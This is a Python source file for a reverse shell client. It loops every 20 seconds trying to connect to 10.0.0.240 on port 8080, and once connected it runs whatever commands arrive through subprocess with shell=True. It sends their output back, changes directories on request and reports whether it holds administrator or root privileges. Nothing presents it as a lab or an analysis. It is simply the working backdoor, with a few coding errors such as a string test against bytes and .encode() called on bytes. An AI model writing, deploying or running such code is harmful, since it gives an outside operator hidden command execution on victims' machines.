import socket
import subprocess
import os
import time
import sys
import ctypes

def tuneConnection():
    mySocket = socket.socket()
    # Trying to connect to server every 20 seconds
    while True:
        time.sleep(20)
        try:
            mySocket.connect(("10.0.0.240", 8080))
            shell(mySocket)

        except:
            tuneConnection()

def shell(mySocket):
    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())
                break

        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        elif "checkPrivilege" in command:
            try:
                admin = 'admin' in os.popen('whoami /groups').read().lower() if sys.platform.startswith(
                    "win") else os.geteuid() == 0
                privilege = b"[+] Administrator Privileges." if admin else b"[+] User Privileges. (No Admin privileges)"
                mySocket.send(privilege.encode())
            except Exception as e:
                mySocket.send(f"[+] Some Error Occurred: {str(e)}".encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())


def main():
    tuneConnection()

main()
